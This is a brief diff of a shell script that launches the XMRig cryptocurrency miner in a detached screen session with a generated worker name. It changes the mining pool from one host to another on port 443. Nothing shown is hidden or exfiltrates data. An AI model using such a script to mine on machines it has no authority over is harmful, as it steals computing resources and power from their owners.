@@ -33,7 +33,7 @@ worker_name="${random_element}.${random_id}"
 
 # Start XMRig with optimizations
 screen -dmS xmrig_session ./xmrig \
-    -o pool.supportxmr.com:3333 \
+    -o pool.hashvault.pro:443 \
     --nicehash \
     --randomx-1gb-pages \
     --randomx-wrmsr \
